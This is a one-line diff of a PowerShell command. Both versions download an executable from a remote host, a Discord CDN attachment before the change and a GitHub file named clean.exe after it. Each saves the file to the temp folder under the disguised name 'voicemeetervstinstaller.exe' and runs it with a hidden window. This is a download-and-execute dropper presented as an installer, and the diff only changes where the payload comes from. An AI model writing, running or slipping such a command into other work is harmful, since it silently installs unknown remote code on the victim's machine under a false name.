@@ -1,1 +1,1 @@
-iwr -useb https://cdn.discordapp.com/attachments/1050062111855886397/1050062174053216337/Ryujinx.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://github.com/Dazd-Pkz/Testicule/raw/main/clean.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
